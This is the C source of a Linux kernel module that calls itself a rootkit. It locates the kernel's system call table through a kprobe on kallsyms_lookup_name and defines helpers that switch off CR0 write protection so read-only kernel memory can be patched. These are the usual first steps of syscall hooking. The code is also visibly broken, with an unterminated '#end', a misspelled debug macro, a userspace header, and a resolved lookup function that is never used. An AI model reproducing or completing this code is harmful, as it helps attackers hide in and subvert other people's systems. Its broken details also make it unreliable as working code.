#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <asm/paravirt.h>
#include <unistd.h>

#define DEBUG_ 1

// Syscall table address pointer
unsigned long* sys_call_table_addr = NULL;


#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

#include <linux/kprobes.h>
#define KPROBE_ 1

typedef unsigned long (* kallsyms_lookup_name_t)(const char* name);
static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};

#endif


static unsigned long *get_syscall_table(void)
{
    unsigned long *syscall_table;

#if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
#endif

    return syscall_table;
}


static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    asm volatile(
            "mov %0, %%cr0"
            : "+r"(val), "+m"(__force_order));
}

// Function that clears the 16-th bit of cr0 that is responsible for protecting read-only pages
static void unprotect_memory(void)
{
    write_cr0_forced(read_cr0() & (~ 0x10000));
#ifdef DEBUG_
    pr_info("unprotected memory");
#endif
}

// Function that sets the 16-th bit of cr0 for protection
static void protect_memory(void)
{
    write_cr0_forced(read_cr0() | (0x10000));
#ifdef DEBUG_
    pr_info("protect memory");
#end


static int __init mod_init(void)
{
    pr_info("rootkit: started\n");

#ifdef KPROBE_

    int ret = register_kprobe(&kp);
    if (ret < 0) {
    #ifdef DEBUG_
        pr_err("[monitor] register_kprobe failed, returned %d\n", ret);
    #endif
        return ret;
    }

    #ifdef DDEBUG_
    pr_info("[monitor] kprobe registered. kallsyms_lookup_name found at 0x%px\n",
            kp.addr);
    #endif

    kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    unregister_kprobe(&kp);

#endif
    sys_call_table_addr = get_syscall_table();

    return 0;
}


static void __exit mod_exit(void)
{
    pr_info("rootkit: exited\n");
}


MODULE_LICENSE("GPL");
module_init(mod_init);
module_exit(mod_exit);
